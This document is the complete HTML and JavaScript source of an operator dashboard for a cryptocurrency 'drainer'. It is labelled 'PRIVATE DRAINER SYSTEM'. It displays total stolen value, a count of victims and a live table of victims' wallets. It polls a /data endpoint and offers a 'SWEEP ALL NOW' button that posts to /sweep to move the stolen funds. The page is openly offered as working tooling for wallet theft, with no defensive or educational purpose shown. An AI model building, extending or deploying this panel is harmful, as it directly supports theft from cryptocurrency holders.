<!DOCTYPE html>
<html class="h-full bg-black text-white">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CONTROL</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'JetBrains Mono', monospace; background: #000; }
    .glow { box-shadow: 0 0 30px rgba(0, 255, 100, 0.6); }
    .border-glow { border: 1px solid #00ff64; }
  </style>
</head>
<body class="h-full flex items-center justify-center">

  <div class="w-full max-w-5xl p-10">
    <!-- Header -->
    <div class="text-center mb-12">
      <h1 class="text-8xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-cyan-400">
        CONTROL
      </h1>
      <p class="text-gray-500 text-xl mt-4">PRIVATE DRAINER SYSTEM // NOV 2025</p>
    </div>

    <!-- Main Stats -->
    <div class="grid grid-cols-3 gap-8 mb-12">
      <div class="bg-gray-900/80 backdrop-blur border-glow glow rounded-2xl p-8 text-center">
        <p class="text-gray-400 text-sm">TOTAL DRAINED</p>
        <p class="text-6xl font-bold text-green-400" id="total">$0</p>
      </div>
      <div class="bg-gray-900/80 backdrop-blur border-glow glow rounded-2xl p-8 text-center">
        <p class="text-gray-400 text-sm">VICTIMS</p>
        <p class="text-6xl font-bold text-cyan-400" id="count">0</p>
      </div>
      <div class="bg-gray-900/80 backdrop-blur border-glow glow rounded-2xl p-8 text-center">
        <p class="text-gray-400 text-sm">SWEEPER</p>
        <p class="text-lg font-mono break-all text-yellow-400" id="wallet">loading...</p>
      </div>
    </div>

    <!-- Live Victims Table -->
    <div class="bg-gray-900/90 backdrop-blur border-glow glow rounded-2xl p-8">
      <h2 class="text-3xl font-bold text-green-400 mb-6">LIVE DRAINS</h2>
      <div class="max-h-96 overflow-y-auto">
        <table class="w-full text-left">
          <thead class="text-gray-500 border-b border-gray-800">
            <tr>
              <th class="pb-3">TIME</th>
              <th class="pb-3">WALLET</th>
              <th class="pb-3">CHAIN</th>
              <th class="pb-3">VALUE</th>
            </tr>
          </thead>
          <tbody id="victims" class="text-sm"></tbody>
        </table>
      </div>
    </div>

    <!-- Control Buttons -->
    <div class="flex justify-center gap-8 mt-12">
      <button onclick="sweep()" class="bg-red-600 hover:bg-red-700 px-12 py-6 rounded-xl text-2xl font-bold glow">
        SWEEP ALL NOW
      </button>
      <button onclick="location.reload()" class="bg-gray-800 hover:bg-gray-700 px-12 py-6 rounded-xl text-2xl font-bold">
        REFRESH
      </button>
    </div>
  </div>

  <script>
    function update() {
      fetch('/data')
        .then(r => r.json())
        .then(d => {
          document.getElementById('total').textContent = '$' + Number(d.total).toLocaleString()
          document.getElementById('count').textContent = d.victims.length
          document.getElementById('wallet').textContent = d.wallet

          const tbody = document.getElementById('victims')
          tbody.innerHTML = d.victims.slice().reverse().map(v => `
            <tr class="border-b border-gray-800 hover:bg-gray-800">
              <td class="py-4 text-gray-400">${v.time}</td>
              <td class="py-4 font-mono text-cyan-400">${v.wallet}</td>
              <td class="py-4">${v.chain}</td>
              <td class="py-4 text-green-400 font-bold">${v.drained}</td>
            </tr>
          `).join('')
        })
    }
    function sweep() {
      fetch('/sweep', {method: 'POST'}).then(() => alert('SWEEP EXECUTED'))
    }
    setInterval(update, 3000)
    update()
  </script>
</body>
</html>
